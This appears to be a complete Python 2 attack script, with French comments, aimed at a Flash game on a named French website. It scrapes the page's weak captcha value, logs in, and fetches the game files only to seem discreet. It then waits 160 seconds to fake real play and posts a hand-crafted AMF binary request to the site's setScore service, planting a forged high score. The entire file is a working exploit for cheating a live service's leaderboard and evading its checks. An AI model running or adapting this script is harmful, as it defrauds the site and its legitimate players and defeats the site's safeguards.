# LOTFREE
import httplib2
import sys
import re
import urllib
import random
from threading import Thread
import time
import BeautifulSoup
import socks
import string

PHPSESSID = ""
ok = 1

navigateur = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8'
h = {}
h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
h["User-Agent"] = navigateur
h["Accept-Language"] = "fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4"
h["Accept-Charset"] = "ISO-8859-1,utf-8;q=0.7,*;q=0.3"
h["Accept-Encoding"] = "identity"

cnx = httplib2.Http()

# Connexion premiere page pour avoir un cookie
resp, data = cnx.request("http://www.trocool.fr/wesh-game", headers=h)

PHPSESSID = resp["set-cookie"].split("=")[1].split(";")[0]
h["Cookie"] = "PHPSESSID=" + PHPSESSID + ";"
print h["Cookie"]

# Recuperation du "captcha"
soup = BeautifulSoup.BeautifulSoup(data)
captcha = soup.find('input', id="captcha")["value"]
print "Captcha:", captcha

# Envoi des indentifiants + captcha
req  = "login=hacker%40plop.com&password=31337&submit=ok"
req += "captcha=" + captcha

h["Content-type"] = "application/x-www-form-urlencoded"
h["Referer"] = "http://www.trocool.fr/wesh-game"
resp, data = cnx.request("http://www.trocool.fr/wesh-game", "POST", body = req, headers = h)

# La page doit etre rechargee
h.pop("Content-type")
resp, data = cnx.request("http://www.trocool.fr/wesh-game", headers=h)

# Si notre login est dans la page alors on est connecte
if data.find("hacker") == -1:
    print "Echec :("
    sys.exit()
soup = BeautifulSoup.BeautifulSoup(data)

# Encore une iframe a charge
resp, data = cnx.request(soup.iframe["src"], headers = h)
soup = BeautifulSoup.BeautifulSoup(data)
print "Logged in :)"

# On fait des requetes pour demander les swf... meme si on s'en fout
# c juste pour etre + discret
resp, data = cnx.request(soup.embed["src"], headers = h)

h.pop("Referer")
# idem
resp, data = cnx.request("http://www.trocool.fr/wesh/swf/jeu.swf", headers = h)

# On attend pour faire croire que l'on joue
time.sleep(160)

# Donnees AMF
s  = "\x00\x00\x00\x01\x00\x10"
s += "amf_server_debug"
s += "\x01\x00\x00\x00\x60\x03\x00\x0a"
s += "coldfusion"
s += "\x01\x01\x00\x0a"
s += "amfheaders"
s += "\x01\x00\x00\x03"
s += "amf"
s += "\x01\x00\x00\x0b"
s += "httpheaders"
s += "\x01\x00\x00\x09"
s += "recordset"
s += "\x01\x01\x00\x05"
s += "error"
s += "\x01\x01\x00\x05"
s += "trace"
s += "\x01\x01\x00\x07"
s += "m_debug"
s += "\x01\x01\x00\x00\x09\x00\x02\x00\x12"
s += "services.getScores"
s += "\x00\x02"
s += "/1"
s += "\x00\x00\x00\x05\x0a\x00\x00\x00\x00\x00\x11"
s += "services.setScore"
s += "\x00\x02"
s += "/2"
s += "\x00\x00\x00"
s += "+"
s += "\x0a\x00\x00\x00\x01\x0a\x00\x00\x00\x03\x02\x00\x04"
s += "2634"
s += "\x02\x00\x08"

# Le score... dans le temps du jeu video
s += "08:01:37"

s += "\x02\x00\x0c"
s += "hacker_31337"

print "Pwning..."
h["Content-type"] = "application/x-amf"
h["Referer"] = "http://www.trocool.fr/wesh/swf/jeu.swf"
resp, data = cnx.request("http://www.trocool.fr/wesh/site/amf/gateway.php", "POST", body = s, headers = h)

def convert(c):
    if c in string.printable:
        return c
    else:
        return " "

result = "".join(map(convert, data))
result = re.sub("\t+", " ", result)
result = re.sub(" +", " ", result)
print result
